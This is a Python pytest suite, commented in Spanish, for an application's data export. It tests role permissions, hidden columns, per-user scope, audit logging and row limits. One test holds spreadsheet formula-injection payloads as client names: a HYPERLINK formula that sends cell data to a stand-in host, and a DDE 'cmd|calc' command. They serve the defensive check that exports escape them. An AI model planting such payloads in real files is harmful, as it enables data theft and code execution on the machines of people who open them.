"""Exportacion segun permisos, con registro de quien exporto (RF-075, RNF-07).

Exportar es la forma mas facil de sacar datos de un sistema, y por eso es donde
los controles se suelen olvidar: la pantalla esconde los montos a quien no debe
verlos, y despues el boton de descargar los entrega en un archivo. Lo que estas
pruebas vigilan es que eso no pase, y que quede dicho quien saco que.
"""
import csv
import io

import pytest
from sqlalchemy import select, text

from app.models.esquema import Exportaciones, Paises, Servicios
from tests.conftest import entrar


@pytest.fixture
def admin(cliente, usuario):
    return entrar(cliente, usuario('administradora'))


@pytest.fixture
def finanzas(cliente, usuario):
    return entrar(cliente, usuario('finanzas'))


def un_cliente(cliente, cab, nombre, **extra):
    datos = {'nombre': nombre}
    datos.update(extra)
    return cliente.post('/api/v1/clientes', headers=cab, json=datos).json()


def filas_csv(respuesta):
    texto = respuesta.content.decode('utf-8-sig')
    return list(csv.reader(io.StringIO(texto), delimiter=';'))


# ------------------------------------------------------------- que se puede

def test_cada_rol_ve_solo_lo_que_puede_exportar(cliente, usuario):
    """La pantalla no deberia ofrecer un boton que va a devolver 403."""
    de = {}
    for rol in ('administradora', 'finanzas', 'operaciones', 'comercial'):
        cab = entrar(cliente, usuario(rol))
        de[rol] = set(cliente.get('/api/v1/exportar/recursos', headers=cab).json()['recursos'])

    assert 'comisiones' in de['administradora'] and 'comisiones' in de['finanzas']
    assert 'comisiones' not in de['operaciones'], 'operaciones no ve la contabilidad'
    assert 'cartera' not in de['operaciones']
    assert 'casos' in de['operaciones'], 'los tramites si son su trabajo'


def test_exportar_algo_que_el_rol_no_puede_da_403(cliente, usuario):
    cab = entrar(cliente, usuario('operaciones'))
    r = cliente.get('/api/v1/exportar/comisiones', headers=cab)
    assert r.status_code == 403 and r.json()['codigo'] == 'sin_permiso'


def test_un_recurso_que_no_existe_se_rechaza(cliente, admin):
    r = cliente.get('/api/v1/exportar/loquesea', headers=admin)
    assert r.status_code == 422


# -------------------------------------------- las columnas, no solo las filas

def test_operaciones_exporta_tramites_pero_sin_el_valor_de_la_venta(cliente, usuario, db):
    """Es el punto de RF-075: el filtro va por COLUMNA, no por todo o nada.

    Operaciones necesita la lista de tramites para trabajar; lo que no necesita
    es cuanto pago cada cliente.
    """
    cab = entrar(cliente, usuario('operaciones'))
    r = cliente.get('/api/v1/exportar/casos?formato=csv', headers=cab)
    assert r.status_code == 200, r.text

    encabezado = filas_csv(r)[0]
    assert 'Estado' in encabezado and 'Solicitante' in encabezado
    assert 'Valor de la venta' not in encabezado, encabezado
    # Y se dice cual falto, en vez de que lo descubra por la columna ausente.
    assert 'Valor de la venta' in r.headers.get('x-columnas-omitidas', '')


def test_administradora_si_ve_el_valor_de_la_venta(cliente, admin):
    r = cliente.get('/api/v1/exportar/casos?formato=csv', headers=admin)
    assert r.status_code == 200
    assert 'Valor de la venta' in filas_csv(r)[0]
    assert r.headers.get('x-columnas-omitidas', '') == ''


def test_el_pasaporte_solo_sale_para_quien_puede_exportar_personas(cliente, usuario, admin):
    """Es el dato mas sensible que guarda el sistema."""
    assert 'Pasaporte' in filas_csv(
        cliente.get('/api/v1/exportar/solicitantes?formato=csv', headers=admin))[0]

    cab = entrar(cliente, usuario('comercial'))
    r = cliente.get('/api/v1/exportar/solicitantes?formato=csv', headers=cab)
    # Comercial no tiene solicitantes.exportar: ni siquiera llega al archivo.
    assert r.status_code == 403


# ------------------------------------------------------- el alcance (RNF-03)

def _un_tramite(cliente, cab, db, nombre, responsable_id):
    from app.models.esquema import Casos, EstadosOperativos
    import datetime as dt
    c = un_cliente(cliente, cab, nombre)
    s = cliente.post('/api/v1/solicitantes', headers=cab,
                     json={'cliente_id': c['id'], 'nombre': nombre}).json()
    pais = db.scalar(select(Paises.id).where(Paises.iso2 == 'US'))
    estado = db.scalar(select(EstadosOperativos.id)
                       .where(EstadosOperativos.codigo == 'registrado'))
    caso = Casos(solicitante_id=s['id'], pais_id=pais, estado_id=estado, fuente='manual',
                 responsable_id=responsable_id, proxima_accion='Pedir documentos',
                 ultima_actividad_en=dt.datetime.now(dt.timezone.utc))
    db.add(caso)
    db.commit()
    return caso


def test_quien_solo_ve_lo_suyo_exporta_solo_lo_suyo(cliente, usuario, admin, db):
    """El alcance se aplica igual que en la pantalla. Si no, exportar seria la
    puerta de atras para ver los tramites de los demas.

    Con datos de verdad: la base de pruebas arranca sin tramites, y comparar
    cero contra cero no prueba nada.
    """
    mio = usuario('operaciones')
    mio.u.alcance = 'asignados'
    db.commit()
    otro = usuario('operaciones')

    _un_tramite(cliente, admin, db, 'Alcance Mio Cliente', mio.u.id)
    _un_tramite(cliente, admin, db, 'Alcance Ajeno Uno', otro.u.id)
    _un_tramite(cliente, admin, db, 'Alcance Ajeno Dos', otro.u.id)

    completo = filas_csv(cliente.get('/api/v1/exportar/casos?formato=csv', headers=admin))
    assert len(completo) - 1 == 3, 'la administradora los exporta los tres'

    cab = entrar(cliente, mio)
    suyos = filas_csv(cliente.get('/api/v1/exportar/casos?formato=csv', headers=cab))
    nombres = [f[1] for f in suyos[1:]]
    assert nombres == ['Alcance Mio Cliente'], nombres


# ----------------------------------------------------- el registro (RNF-07)

def test_cada_exportacion_queda_registrada_con_quien_y_cuanto(cliente, admin, db):
    """Un archivo con 866 personas deja de estar bajo el control del sistema en
    cuanto se descarga. Lo minimo es saber quien lo saco."""
    antes = db.scalar(select(text('count(*)')).select_from(Exportaciones)) or 0
    r = cliente.get('/api/v1/exportar/clientes?formato=xlsx', headers=admin)
    assert r.status_code == 200

    registros = db.scalars(select(Exportaciones)
                           .order_by(Exportaciones.id.desc())).first()
    assert (db.scalar(select(text('count(*)')).select_from(Exportaciones)) or 0) == antes + 1
    assert registros.recurso == 'clientes' and registros.formato == 'xlsx'
    assert registros.filas == int(r.headers['x-filas'])
    assert registros.filtros['alcance'] == 'todos'
    assert 'columnas' in registros.filtros


def test_el_historial_dice_quien_exporto_y_lo_ve_quien_audita(cliente, admin, usuario):
    cliente.get('/api/v1/exportar/clientes?formato=csv', headers=admin)
    h = cliente.get('/api/v1/exportar/historial', headers=admin)
    assert h.status_code == 200 and len(h.json()) >= 1
    assert h.json()[0]['recurso'] == 'clientes'
    assert h.json()[0]['usuario']

    # Y no lo ve cualquiera: es el registro de quien saco datos sensibles.
    cab = entrar(cliente, usuario('comercial'))
    assert cliente.get('/api/v1/exportar/historial', headers=cab).status_code == 403


def test_el_registro_anota_las_columnas_que_se_omitieron(cliente, usuario, db):
    """Para poder responder despues «que se llevo exactamente»."""
    cab = entrar(cliente, usuario('operaciones'))
    cliente.get('/api/v1/exportar/casos?formato=csv', headers=cab)
    ultimo = db.scalars(select(Exportaciones).order_by(Exportaciones.id.desc())).first()
    assert 'Valor de la venta' in ultimo.filtros['omitidas']


# ----------------------------------------------------------------- formatos

def test_el_csv_lleva_bom_para_que_excel_abra_las_tildes(cliente, admin):
    r = cliente.get('/api/v1/exportar/clientes?formato=csv', headers=admin)
    assert r.content.startswith(b'\xef\xbb\xbf'), 'sin BOM, Excel en espanol parte las tildes'


def test_el_xlsx_sale_como_archivo_de_excel(cliente, admin):
    r = cliente.get('/api/v1/exportar/clientes?formato=xlsx', headers=admin)
    assert r.status_code == 200
    # Un .xlsx es un zip: empieza por PK.
    assert r.content[:2] == b'PK'
    assert 'clientes-' in r.headers['content-disposition']


def test_los_datos_salen_de_verdad(cliente, admin, db):
    un_cliente(cliente, admin, 'Exportada Prueba Cliente', ciudad='Medellín')
    filas = filas_csv(cliente.get('/api/v1/exportar/clientes?formato=csv', headers=admin))
    nombres = [f[1] for f in filas[1:]]
    assert 'Exportada Prueba Cliente' in nombres
    assert any('Medellín' in f for f in filas[1:][nombres.index('Exportada Prueba Cliente')])


# ------------------------------------------------- lo que hace el archivo al abrirse

def test_un_nombre_que_empieza_por_igual_no_se_ejecuta_al_abrir_el_archivo(cliente, admin):
    """Excel y Sheets ejecutan como formula lo que empieza por «=», «+», «-» o «@».

    El dato entra por el nombre del cliente, que lo escribe cualquiera, y se
    ejecuta en el computador de quien abra la descarga: no es un problema de
    como se ve el archivo sino de que el archivo corre codigo. Se neutraliza
    poniendole una comilla delante, que Excel entiende como «esto es texto».
    """
    un_cliente(cliente, admin, '=HYPERLINK("http://malo.co?f="&A1,"Factura")')
    un_cliente(cliente, admin, '@SUM(1+1)*cmd|calc', documento='9988771')

    for formato in ('csv', 'xlsx'):
        cuerpo = cliente.get(f'/api/v1/exportar/clientes?formato={formato}',
                             headers=admin).content
        crudo = cuerpo.decode('utf-8', 'ignore') if formato == 'csv' else str(cuerpo)
        assert '=HYPERLINK' not in crudo.replace("'=HYPERLINK", ''), (
            f'en {formato} el nombre sigue arrancando por «=» y Excel lo va a ejecutar')
        assert '@SUM' not in crudo.replace("'@SUM", ''), formato


def test_una_exportacion_sin_tope_es_una_forma_de_vaciar_la_base(cliente, admin, db,
                                                                 monkeypatch):
    """Con 866 personas hoy no se nota; el tope es lo que evita que un dia
    alguien se lleve la base entera en una peticion."""
    from app.services import exportar

    monkeypatch.setattr(exportar, 'MAX_FILAS', 2)
    for i in range(4):
        un_cliente(cliente, admin, f'Tope Prueba Numero{i}', documento=f'70700{i}')

    r = cliente.get('/api/v1/exportar/clientes?formato=csv', headers=admin)
    assert r.status_code == 409, r.text
    assert r.json()['codigo'] == 'demasiadas_filas'
    assert '2' in r.json()['detalle'], 'el mensaje tiene que decir cual es el tope'
